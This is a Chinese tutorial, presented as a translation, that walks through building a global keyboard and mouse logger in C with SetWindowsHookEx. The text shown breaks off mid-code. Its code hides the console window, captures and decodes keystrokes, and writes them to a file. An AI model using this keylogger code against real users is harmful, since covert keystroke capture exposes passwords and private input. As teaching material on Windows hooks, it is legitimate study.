# 实现简单全局键盘、鼠标记录器
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
**记一次通过HOOK实现简单的全局键盘、鼠标记录器**
0、说明1、SetWindowsHookEx函数介绍
（1）第一个参数
（2）第二个参数
（3）第三个参数
（4）第四个参数
2、设置全局钩子获取消息队列中的消息
（1）写在main函数之前
（2）安装钩子
（3）获取消息队列中的消息
（4）设置钩子过程函数
3、键盘钩子过程函数
（1）键盘钩子过程函数的参数
（2）KBDLLHOOKSTRUCT结构体
（3）识别大小写或特殊字符
（4）记录按键时间和按键状态
（5）将按键信息记录到文件里
（6）拦截所有按键消息，按F1键卸载钩子解除拦截
4、鼠标钩子过程函数
（1）键盘钩子过程函数的参数
（2）MSLLHOOKSTRUCT结构体
（3）识别鼠标按键消息
（4）拦截鼠标按键消息，记录到文件
5、总结
6、演示效果
7、所有源码
7、参考文章
## 0、说明
记录一次利用`SetWindowsHookEx`这个API设置全局键盘、鼠标钩子的过程。
这个钩子是直接在写在exe里面，没有写在dll里。通过消息循环，钩子会直接截获消息队列中的消息，执行钩子对应的过程函数。
相当于 **基于windows消息机制的消息Hook** ，
最后效果是：
  1. 拦截全局键盘，识别大小写和特殊字符，（不响应键盘所有按键）。
  2. 鼠标点击消息，识别左右按键，不拦截鼠标移动消息，（鼠标可以正常移动，无法响应点击）。
  3. 将按键消息和鼠标点击消息记录在文件里。
  4. 直到按下`F1`键时，卸载全局键盘、鼠标钩子，所有恢复正常。
当然，也可以不拦截消息，只做一个消息监视器，监视所有消息。
> 环境：Win10
> 编译器：VS2019
## 1、SetWindowsHookEx函数介绍
[微软官方文档：SetWindowsHookEx](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa)
    //HHOOK是设定的钩子句柄，一般定义为全局变量。
    HHOOKSetWindowsHookExA(
    [in] intidHook,
    [in] HOOKPROClpfn,
    [in] HINSTANCEhmod,
    [in] DWORDdwThreadId
    );
### **（1）第一个参数**
`idHook`代表代表设置钩子的类型，比如键盘钩子、鼠标钩子、消息钩子等，微软给了宏定义，以下列几个常用的
**宏含义**  
---  
WH_KEYBOARD | 钩取键盘输入消息  
WH_KEYBOARD_LL | 钩取低级键盘输入消息  
WH_MOUSE | 钩取鼠标输入消息  
WH_MOUSE_LL | 钩取低级鼠标输入消息  
WH_MSGFILTER | 监视一些窗口控件交互的消息（对话框、菜单、滚动条等）  
WH_GETMESSAGE | 钩取所有从消息队列出来的消息  
我们要制作的钩子类型就是`WH_KEYBOARD_LL`、和`WH_MOUSE_LL`，（如果是在dll中就得使用`WH_KEYBOARD`和`WH_MOUSE`）。
### **（2）第二个参数**
`lpfn`代表钩子的过程函数指针，钩子的过程函数类型是`HOOKPROC`，微软有官方解释：
[微软官方文档：HOOKPROC](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nc-winuser-hookproc)
    HOOKPROCHookproc;
    ​
    LRESULTHookproc(
    intcode,
    [in] WPARAMwParam,
    [in] LPARAMlParam
    )
钩子过程函数类型大概是固定的，三个参数，记录消息信息，但重点是，不同的钩子类型，也对应不同的参数用法。（下面的键盘钩子过程函数、鼠标钩子过程函数会分别展开讲解。）
### **（3）第三个参数**
`hmod`指向一般指向过程函数所在模块的句柄，对于本钩子而言，就是自己模块的句柄，即：
    GetModuleHandle(NULL)
### **（4）第四个参数**
`dwThreadId`代表需要勾住的特定线程的ID。
对于桌面应用程序，如果设置为NULL，则挂钩过程与调用线程在同一桌面上运行的所有现有线程相关联，即设置为NULL代表全局钩子。
## 2、设置全局钩子获取消息队列中的消息
### **（1）写在main函数之前**
因为我写的钩子是直接写到exe里面，所以下面有声明全局变量和一些函数声明写在main函数之前。
    #define _CRT_SECURE_NO_DEPRECATE//屏蔽VS的一些安全警告。。。
    ​
    //预编译，让控制台窗口程序，不显示控制台窗口，直接后台运行。。。
    #pragma comment(linker, "/subsystem:\"windows\"   /entry:\"mainCRTStartup\"")
    ​
    #include
    #include 
    #include 
    ​
    ​
    ​
    //全局键盘Hook句柄
    HHOOKhKeyboardHook;
    ​
    //全局鼠标hook句柄
    HHOOKhMouseHook;
    ​
    //安装钩子hook的函数
    BOOLHookKeyBoardProc();
    ​
    //记录Shift消息
    BOOLbShift=FALSE;
    ​
    ​
    //表示按键F1即卸载钩子
    charexitKey[20] ="WM_KEYUP_[F1]";
    ​
    //键盘钩子过程函数
    LRESULTCALLBACKKeyBoardProc(intnCode, WPARAMwParam, LPARAMlParam);
    //鼠标钩子键盘函数
    LRESULTCALLBACKMouseCursorProc(intnCode, WPARAMwParam, LPARAMlParam);
    ​
    //根据钩子过程函数的参数消息，返回按键的字符（大小写、特殊字符）
    //参数1：按键虚拟码,即键盘上每个按键对应一个虚拟码，不区分大小写，微软官方文档：https://docs.microsoft.com/zh-cn/windows/win32/inputdev/virtual-key-codes
    //参数2：是否按下大写按键，TRUE代表按下
    //参数3：是否按住shift按键，TRUE代表正按住
    //参数4：函数返回的按键字符，存储在Out指针指向的内存。
    //返回值：无
    voidHookCode(DWORDcode, BOOLcaps, BOOLshift ,char*Out);
    ​
    //将记录的键盘、鼠标信息写入文件
    BOOLWriteMessageToFile(char*Date_Key, intlen);
### **（2）安装钩子**
然后在主进程里安装钩子。
    //安装键盘钩子
    hKeyboardHook=SetWindowsHookExA(
    WH_KEYBOARD_LL,//Installs a hook procedure that monitors low-level keyboard input events.
    KeyBoardProc, //键盘钩子的过程函数
    GetModuleHandle(NULL),//指向一般指向过程函数所在模块的句柄
    NULL//代表需要勾住的特定线程的ID，NULL代表全局钩子
      );
    ​
    //安装鼠标钩子
    hMouseHook=SetWindowsHookExA(
    WH_MOUSE_LL,//Installs a hook procedure that monitors low-level mouse input events.
    MouseCursorProc, //鼠标钩子的过程函数
    GetModuleHandle(NULL), //指向一般指向过程函数所在模块的句柄
    NULL//代表需要勾住的特定线程的ID，NULL代表全局钩子
      );//安装
### **（3）获取消息队列中的消息**
当全局钩子设定好，我们要主动去系统消息队列中获取消息。
    MSGMsg{};
    while (GetMessage(&Msg, NULL, 0, 0) >0) {
    TranslateMessage(&Msg);
    DispatchMessage(&Msg);
    }
因为钩子函数特性，如果写在主程序exe里，搭配这个消息循环，这时所有消息会优先通过提前安装的钩子，通过钩子的过程函数，可以处理这个消息，并决定这个消息是否传递给其他窗口过程函数。
### **（4）设置钩子过程函数**
这里给出钩子过程函数框架：[微软官方文档：HOOKPROC](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nc-winuser-hookproc)
    LRESULTCALLBACKHookProcedureFunc(intnCode, WPARAMwParam, LPARAMlParam) {
    printf("Hello！HOOK Procedure Function！\n");
    return0;
    //return 1;
    //return CallNextHookEx
    }
注意返回值，根据规定，
非零就是将钩子截获的特定类型消息不传递给窗口过程函数，即直接拦截。
为零就继续传递窗口过程函数处理，即只是监视。
但如果存在相同类型的钩子链，可以通过
return [CallNextHookEx](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callnexthookex)
**来传递截获的消息传给钩子链中的下一个钩子再做处理，即向下传递钩取的消息，但要注意，这样的话，过程函数的返回值也会通过钩子链向上传递，影响消息是否传被拦截还是监视。**
**此时钩子已经安装好了，已经可以实现简单的监视功能，所有我们符合我们设置类型的消息会优先被我们的钩子函数处理。**
**下面就是完善钩子的过程函数，对截获的消息进行处理，实现键盘、鼠标消息记录。**
## 3、键盘钩子过程函数
    //安装键盘钩子
    hKeyboardHook=SetWindowsHookExA(WH_KEYBOARD_LL, KeyBoardProc, GetModuleHandle(NULL),NULL );
当第一个参数钩子类型设置为`WH_KEYBOARD_LL`时，第四个参数为`NULL`时，代表设置的钩子为全局键盘钩子。
此时被拦截的消息表示为：按键DOWN、按键UP。（即一个按键被按下产生一个消息，放开按键又产生一个消息）
### **（1）键盘钩子过程函数的参数**
此时键盘钩子对应的窗口过程函数：[微软官方：LowLevelKeyboardProc
回调函数](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644985\(v=vs.85\))
    LRESULTCALLBACKKeyBoardProc(intnCode, WPARAMwParam, LPARAMlParam) {
    return1;//代表拦截消息
    }
第一个参数nCode一般记录被此钩子拦截的消息的次数。重点在于后面两个参数
第二个参数代表windows消息：`WM_KEYDOWN`和`WM_KEYUP`，分别代表键盘按键按下和放开。
第三个参数指向[ **KBDLLHOOKSTRUCT**](https://msdn.microsoft.com/en-us/library/ms644967\(v=vs.85\))结构的指针，结构体指针。
### **（2）KBDLLHOOKSTRUCT结构体**
    typedefstructtagKBDLLHOOKSTRUCT {
    DWORDvkCode;//虚拟键码，1~254范围的值
    DWORDscanCode;
    DWORDflags;
    DWORDtime;
    ULONG_PTRdwExtraInfo;
    } KBDLLHOOKSTRUCT, *LPKBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;
键盘钩子这里我们只需要明白这个结构体的第一个成员`vkCode`代表一个虚拟键码。
[虚拟键码](https://docs.microsoft.com/zh-cn/windows/win32/inputdev/virtual-key-codes)：即键盘上每一个按键都对应这一个虚拟键码。
但是虚拟键码不会区分大小写或特殊字符的情况。所以需要我们通过算法识别。
### **（3）识别大小写或特殊字符**
一般我们使用键盘，造成大小写差异的按键就是`CapsLk`和`Shift`按键，注意`Shift`有左右两个。
**关于**`CapsLk`按键，通过下面获取`CapsLk`状态，是否开启大写。
    SHORTcapsShort=GetKeyState(VK_CAPITAL);
    BOOLcaps=FALSE;  // 默认大写关闭
    if (capsShort>0)
    {
    // 如果大于0，则大写键按下，说明开启大写；反之小写
    caps=TRUE;
    }
关于`Shift`按键，通过下面获取`Shift`按键状态，是否正在被按下且没有放开按键。
    //VK_LSHIFT和VK_RSHIFT分别代表左右Shift按键的虚拟键码。
    if (p->vkCode==VK_LSHIFT||p->vkCode==VK_RSHIFT)
    {
    if (wParam==WM_KEYDOWN)
      {
    bShift=TRUE;
      }
    elseif (wParam==WM_KEYUP)
      {
    bShift=FALSE;
      }
    else
      {
    bShift=FALSE;
      }
    }
然后通过算法`HookCode`子函数，来识别按键是否大小写或特殊字符
    PKBDLLHOOKSTRUCTp= (PKBDLLHOOKSTRUCT)lParam;
    HookCode(p->vkCode , caps, bShift, WM_Key);//WM_Key是自定义的数组，存储返回的字符串
    ​
    //HookCode函数算法学习自文章末尾给的参考文章。
    /********************************************************
    //根据钩子过程函数的参数消息，返回按键的字符（大小写、特殊字符）
    //参数1：按键虚拟码,即键盘上每个按键对应一个虚拟码，不区分大小写，微软官方文档：https://docs.microsoft.com/zh-cn/windows/win32/inputdev/virtual-key-codes